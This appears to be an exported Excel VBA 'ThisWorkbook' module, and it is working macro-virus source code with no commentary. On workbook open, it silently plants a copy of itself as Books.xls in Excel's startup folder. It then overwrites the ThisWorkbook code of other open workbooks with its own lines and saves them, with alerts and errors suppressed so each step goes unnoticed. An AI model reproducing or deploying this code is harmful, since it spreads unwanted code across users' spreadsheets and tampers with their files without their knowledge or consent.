   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisWorkbook"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Const Sn = "Books.xls"
   Sub CreatSelf(r As String)
       On Error Resume Next
       Application.DisplayAlerts = False
       LookAdd
       Application.ActiveWorkbook.SaveAs r
       Application.DisplayAlerts = True
       On Error GoTo 0
   End Sub

   Private Sub Workbook_NewSheet(ByVal Sh As Object)

   End Sub

   Private Sub Workbook_Open()
       On Error Resume Next
       Application.ScreenUpdating = False
       r = Application.StartupPath & "\" & Sn
       s = Application.Workbooks(Sn).Name
       If s = "" Then
           cf = ActiveWorkbook.Name
           Application.Workbooks.Add
           CreatSelf (r)
           Workbooks(cf).Activate
       End If

       Application.ScreenUpdating = True
       On Error GoTo 0
   End Sub
   Function LookAdd() As Boolean
       On Error Resume Next
       If ThisWorkbook.Name = ActiveWorkbook.Name Then GoTo NoAdd
       With ActiveWorkbook.VBProject.VBComponents("ThisWorkbook")
           s = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.CountOfLines
           m = .CodeModule.CountOfLines
           If m >= s Then GoTo NoAdd
           Do While .CodeModule.CountOfLines > 0
               .CodeModule.DeleteLines 1, .CodeModule.CountOfLines
           Loop
           For i = 1 To s
               sl = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule.Lines(i, 1)
               .CodeModule.InsertLines i, sl
           Next i
           ap = ActiveWorkbook.Path
           If ap <> "" Then ActiveWorkbook.Save
       End With
   YesAdd:
       LookAdd = True
       On Error GoTo 0
       Exit Function
   NoAdd:
       LookAdd = False
       On Error GoTo 0
   End Function
